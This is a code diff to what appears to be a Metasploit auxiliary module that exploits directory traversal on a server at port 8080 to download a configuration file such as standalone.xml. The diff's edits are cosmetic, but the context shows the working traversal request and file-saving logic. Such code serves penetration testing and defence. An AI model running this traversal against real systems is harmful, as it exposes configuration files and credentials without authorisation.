@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new("FILEPATH", [true, 'Full path to the file to read', 'standalone\\\\configuration\\\\standalone.xml'])
+        OptString.new("FILEPATH", [true, 'Full path to the file to read', 'standalone\\configuration\\standalone.xml'])
       ], self.class)
 
     register_advanced_options(
@@ -45,13 +45,13 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    print_status("Attempting to download: #{datastore['FILEPATH']}")
+    print_status("#{peer} - Attempting to download: #{datastore['FILEPATH']}")
 
     traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
     res = send_request_raw({
       'method' => 'GET',
       'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
-    },)
+    })
 
     if res && res.code == 200
       vprint_line(res.to_s)
@@ -64,9 +64,9 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_status("File saved in: #{path}")
+      print_good("#{peer} - File saved in: #{path}")
     else
-      print_error("Nothing was downloaded")
+      print_error("#{peer} - Nothing was downloaded")
     end
   end
 end
